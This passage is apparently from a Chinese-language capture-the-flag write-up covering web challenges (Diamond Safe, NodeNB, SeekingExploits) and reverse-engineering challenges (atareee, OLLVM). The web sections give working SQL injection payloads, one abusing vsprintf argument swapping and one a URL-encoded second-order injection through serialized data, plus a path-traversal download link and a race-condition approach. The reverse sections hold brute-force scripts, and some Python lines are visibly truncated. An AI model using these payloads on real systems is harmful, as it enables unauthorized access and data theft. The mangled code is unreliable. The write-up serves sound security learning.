            $args_is_array = false;
            if (is_array($args[0]) && count($args) == 1 ) {
                $args = $args[0];
                $args_is_array = true;
            }
            $count_format = substr_count($query, '%s');
            if($count_format !== count($args)){
                error('Wrong number of arguments!');
                return;
            }
            // escape
            foreach ($args as &$value){
                $value = static::$db->real_escape_string($value);
            }
            // prepare
            $query = str_replace("%s", "'%s'", $query);
            $query = vsprintf($query, $args);
            return $query;
        }
prepare中用到了`$query = vsprintf($query, $args)`;  
这里的漏洞点是：
我们可以通过一下payload进行闭合：
    password=password%1$&name=)+or+1=1%23name
把name的值通过%1带到password中，绕过过滤，闭合sha1()，然后用or进行永真闭合
登陆进去之后
可以看到有下文件的点，不过有个校验：checkurl和gen_secure_url，大致意思是把要下的文件加上secret的md5值和传入的md5值比较，但是这里获取参数用的是$_SERVER[‘QUERY_STRING’]，获取到的是未urldecode的字符串，所以这里可以直接利用QUERY_STRING不自动urldecode的特性和php中空格等于的特性一把梭
构造链接：
    https://diamond-safe.flu.xxx/download.php?h=f2d03c27433d3643ff5d20f1409cb013&file_name=FlagNotHere.txt&file%20name=../../../../../flag.txt
Getflag
###  NodeNB(low):
创建用户是分两步：
    await db.set(`user:${name}`, uid);
    await db.hmset(`uid:${uid}`, { name, hash });
删除用户的时候是：
    await db.set(`user:${user.name}`, -1);
    await db.del(`uid:${uid}`);
Del uid的时候 `{ name, hash }` 应该是被删掉了的，但是此时用户名对应的uid被设为了 -1  
结合访问note时候的判断：
    if (!await db.hexists(`uid:${uid}`, 'hash')) {
                // system user has no password
                return true;
            }
`Del session`是在`del uid之`后的，就是说`del uid`之后，
session还有一段有效的时间，这个时候竞争着去请求/note/flag，就该就能进入`if (!await db.hexists(uid:${uid},
'hash'))`，返回 true 了吧  
条件竞争题
用burp intruder 一直请求 /notes/flag，然后再去删用户
###  SeekingExploits(High):
(当时没出来 赛后做出来了 记录一下)
emarket-api.php有序列化函数，并且插入exploit_proposals表
另外一个emarket.php文件从数据库中获取数据，并且反序列化，进入simple_select函数中，而这一步没有对sql做任何的过滤，exploit_proposals表中的内容是可以随便插入的，所以这里思路就是二次注入
emarket.php是在插件目录下，所以找一个地方可以hook去插件的地方，执行这块儿代码
这里可以可以hook进去执行emarket.php的list_proposals方法，然后反序列化。这里要执行到run_hooks的前提是要先发过邮件
这里如果pmid从数据库中找不到就会报错。
但是这里因为有my_serialize/unserialize方法，不能对object进行操作，所以这里的trick就是利用在  
escape_string中的validate_utf8_string方法，可以把%c0%c2变成?，这样就逃逸出来了
Poc:
    /emarket-api.php?action=make_proposal&description=1&software=1.2&latest_version=4&additional_info[a]=%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2&additional_info[b]=%22%3b%73%3a%37%3a%22%73%6f%6c%64%5f%74%6f%22%3b%73%3a%35%35%3a%22%30%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%75%73%65%72%6e%6f%74%65%73%29%20%20%66%72%6f%6d%20%6d%79%62%62%5f%75%73%65%72%73
打完poc后，直接点击查看就行了
## Reverse:
###  atareee(low):
导入Ghidra分析  
经过调试可得到，0x50C2地址为我们的输入数据，在xorenc函数中进行加密操作，逻辑如下
接下来是验证函数，0x509A为输出到屏幕的部分，图中标注的0x5276和0x524e分别为错误、正确字符串的位置
接下来使用Python复现逻辑并进行爆破
    target = [
        0x14,  0x1E,   0xC,  0xE0,
        0x30,  0x5C,  0xCE,  0xF0,
        0x36,  0xAE,  0xFC,  0x39,
        0x1A,  0x91,  0xCE,  0xB4,
        0xC4,   0xE,  0x18,  0xF3,
        0xC8,  0x8E,   0xA,  0x85,
        0xF6, 0xbd
    ]
    array_50c2 = [
        0xD9,  0x50,  0x48,  0xB9,
        0xD8,  0x50,  0x48,  0x60,
        0x46,  0x54,  0x43,  0x44,
        0x45,  0x49,  0x50,  0x55,
        0x52,  0x53,  0x4C,  0x47,
        0x58,  0x51,  0xF3,  0x50,
        0x8,  0x51, 0x10
    ]
    array_5219 = [
        0xBD,  0x43,  0x11,  0x37,
        0xF2,  0x69,  0xAB,  0x2C,
        0x99,  0x13,  0x12,  0xD1,
        0x7E,  0x9A,  0x8F,   0xE,
        0x92,  0x37,  0xF4,  0xAA,
        0x4D,  0x77,   0x3,  0x89,
        0xCA,  0xFF,
    ]
    array_5234 = [0 for _ in range(0x1a)]
    in_C = 0
    j = 0
    for i in range(0x19, -1, -1):
        in_C = 1 if (0x19 > 7)) & 0xff
            else:
                array_5234[i] = array_50c2[i] ^ array_5219[i]
                var1 = array_5234[i]
                array_5234[i] = ((var1 > 7 != 0:
                array_5234[i] = array_5234[i] + 1
            if array_5234[i] == target[i]:
                print (chr(j), end= '')
                break
        else:
            print ("no")
    #KNOTS_ORT3R_M3D_T3G_GALP
由于脚本为倒序输出，需要将得到字符串进行倒序处理，即FLAG_G3T_D3M_R3TR0_ST0NK  
但是最后两个字符无法通过爆破得到，但题目的成功字符串给出了提示
经过验证得出完整flag: FLAG_G3T_D3M_R3TR0_ST0NKZ!
###  OLLVM (High):
通过逆向可以得知原控制流逻辑为
    原始输入数据 989898121212
    firstfn      2      sbuf[2] = not(-0x4DDB14EE5C8771C5-v)+1 = 0x4DDBAD86F49983D7
    sub_46B1F0   0x1A   sbuf[4] = 0xB31C9545AC410D72
    sub_40FA60   0x32   sbuf[5] = (sbuf[2] ^ 0xB31C9545AC410D72) + 0x8BC715D20D923835 = 0x8A8E4E95666AC6DA
    sub_46B1F0   0x4A   sbuf[6] = 0xCE9A20C53746A9F7
    sub_42C730   0x62   sbuf[7] = (sbuf[5] ^ sbuf[6]) > 32
    sub_43CDF0   0x92   sbuf[9] = (sbuf[7] | sbuf[8]) = 0x512C6F2D44146E50 ?
    sub_46B1F0   0xAA   sbuf[10] = 0xA648BD40DACE4EF5
    sub_439C40   0xC2   sbuf[11] = sbuf[9] * 0xA648BD40DACE4EF5 = 0x3CD903714589F290 = 0x512C6F2D44146E50 * 0xA648BD40DACE4EF5
    sub_43F240   0xDA   sbuf[12] = sbuf[11] + 0x18B205A73CB902B7 = 0x558B09188242F547
    sub_46B1F0   0xF2   sbuf[13] = 0x0000000000000008
    sub_461DA0   0x10A  sbuf[14] = (sbuf[11] + 0x18B205A73CB902B7) >> 8 = 0x00558B09188242F5
    sub_4195F0   0x122  sbuf[15] = (sbuf[12] > 8) = 0x009F0E2ADA165ECD
    sub_42A9F0   0x182  sbuf[19] = (sbuf[17] >> 8) & 0x00FF00FF00FF00FF
    sub_46B1F0   0x19A  sbuf[20] = 0x0000000000000008
    sub_435E50   0x1B2  sbuf[21] = (sbuf[17]  0x0E9FDA2A5E161ACD
    sub_46B1F0   0x1E2  sbuf[23] = 0xB9B8A788569D772D
    endfunction  0x1FA  sbuf[24] = -((sbuf[22] ^ 0xB9B8A788569D772D) * 0x51F6D71704B266F5)+1 = C54C16BC5F0898A0
求出逆运算,即可解密flag
乘法需要爆破,可以先爆破低32位,再爆破高32位,代码里我用多线程8核来爆破的
解密flag代码:
    #include 
    #include "windows.h"
    DWORD64 g_chunk_size = 0;
    DWORD64 g_jieguo = 0;
    DWORD64 g_chengshu = 0;
    bool g_finded_low = false;
    DWORD64 g_find_val_low = 0;
    bool g_finded_high = false;
    DWORD64 g_find_val_high = 0;
    DWORD CalcThread(PVOID start_v) {
        DWORD64 ustartv = (DWORD64)start_v;
        DWORD targetv = g_jieguo & 0xFFFFFFFF;
        DWORD chengshulow = g_chengshu & 0xFFFFFFFF;
        for (DWORD64 i = 0; i < g_chunk_size; i++) {
            if (
                (((ustartv + i) * chengshulow) & 0xFFFFFFFF) == targetv
                ) {
                g_find_val_low = (ustartv + i);
                g_finded_low = true;